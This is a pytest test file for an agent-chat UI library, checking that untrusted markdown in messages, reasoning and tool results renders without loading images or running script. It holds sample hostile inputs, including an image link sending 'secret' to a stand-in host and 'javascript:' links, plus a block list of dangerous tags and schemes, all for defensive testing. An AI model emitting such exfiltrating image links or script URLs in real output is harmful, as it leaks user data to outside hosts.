import html
from html.parser import HTMLParser

import pytest

from panel_agents import RunState
from panel_agents import events as ev
from panel_agents.components.chat import AgentChat
from panel_agents.components.renderers import render
from panel_agents.security import (
    _escape_markdown,
    set_trusted_image_origins,
    trusted_image_origins,
    untrusted_markdown,
)

from .sanitiser_payloads import PAYLOADS, img


@pytest.fixture(autouse=True)
def no_trusted_origins():
    set_trusted_image_origins([])
    yield
    set_trusted_image_origins([])


def html_of(pane):
    """The HTML a pane sends to the browser, through Panel's public model API."""
    from bokeh.document import Document

    return html.unescape(pane.get_root(Document()).text)


def rendered(text):
    return html_of(untrusted_markdown(text))


class _Tags(HTMLParser):

    def __init__(self):
        super().__init__()
        self.tags = []

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, dict(attrs)))


def assert_inert(html):
    """No element that loads or runs anything, judged on the parsed HTML rather than its text."""
    parser = _Tags()
    parser.feed(html)
    for tag, attrs in parser.tags:
        assert tag not in ("img", "iframe", "base", "meta", "link", "style", "script", "svg", "object", "embed", "source"), html
        assert not any(name.startswith("on") or name in ("style", "srcset", "src") for name in attrs), html
        href = (attrs.get("href") or "").strip().lower()
        assert not href.startswith(("javascript", "vbscript", "data", "//")), html


@pytest.mark.parametrize("name", list(PAYLOADS))
def test_payload_renders_inert(name):
    assert_inert(rendered(PAYLOADS[name]))


def test_images_become_links_that_show_their_url():
    html = rendered("![x](https://evil.test/?d=secret)")
    assert '<a href="https://evil.test/?d=secret">image: x</a>' in html
    assert "<code>https://evil.test/?d=secret</code>" in html


def test_links_show_their_url_and_unsafe_schemes_are_text():
    assert "<code>https://docs.example/a</code>" in rendered("[docs](https://docs.example/a)")
    assert "<code>" not in rendered("[https://a.example](https://a.example)")
    assert "<a" not in rendered("[click](javascript:alert(1))")
    assert "<a" not in rendered("[x](//evil.test/x)")


def test_math_is_not_typeset():
    pane = untrusted_markdown("$$\\href{javascript:x}{y}$$")
    model = pane.get_root(__import__("bokeh.document", fromlist=["Document"]).Document())
    assert model.disable_math and "\\href" in html.unescape(model.text)


def test_trusted_origins_allow_their_images():
    set_trusted_image_origins(["https://tiles.example/"])
    assert trusted_image_origins() == {"https://tiles.example"}
    assert '<img src="https://tiles.example/a.png"' in rendered("![m](https://tiles.example/a.png)")
    assert "<img" not in rendered("![m](https://evil.test/a.png)")
    set_trusted_image_origins(["*"])
    assert "<img" in rendered("![m](https://evil.test/a.png)")
    assert_inert(rendered(img("raw")))


def test_raster_data_images_are_kept_and_svg_is_not():
    assert "<img" in rendered("![p](data:image/png;base64,AAAA)")
    assert "<img" not in rendered("![p](data:image/svg+xml;base64,AAAA)")


def test_plain_text_escaping():
    text = img("plain") + " **bold** [l](https://x) $$x$$"
    out = html_of(untrusted_markdown(_escape_markdown(text)))
    assert_inert(out)
    assert "<strong>" not in out and "<a" not in out


def test_chat_text_and_thinking_are_inert():
    state = RunState(flush_interval=0)
    state.apply_many([
        ev.RunStarted(run_id="r"),
        ev.ThinkingStart(message_id="t", run_id="r"),
        ev.ThinkingContent(message_id="t", delta=img("think"), run_id="r"),
        ev.TextMessageStart(message_id="m", run_id="r"),
        ev.TextMessageContent(message_id="m", delta=PAYLOADS["nested_brackets"], run_id="r"),
    ])
    chat = AgentChat(state)
    message_pane = chat.view_for(state.messages["m"]).object
    thinking_pane = chat.view_for(state.messages["t"]).objects[0]
    for pane in (message_pane, thinking_pane):
        assert inert_pane(pane)
        assert_inert(html_of(pane))


def inert_pane(pane):
    from panel_agents.security import inert_markdown

    return pane.disable_math and inert_markdown in pane.plugins


@pytest.mark.parametrize("kind", [None, "text", "markdown", "unknown-kind"])
def test_text_results_and_artifacts_are_inert(kind):
    pane = render(img("result"), kind=kind)
    assert inert_pane(pane)


def test_objects_without_a_renderer_do_not_render_their_html():
    class Rich:
        def _repr_html_(self):
            return img("repr_html")

        def __str__(self):
            return "Rich object"

    import panel as pn

    pane = render(Rich())
    assert isinstance(pane, pn.pane.Str)
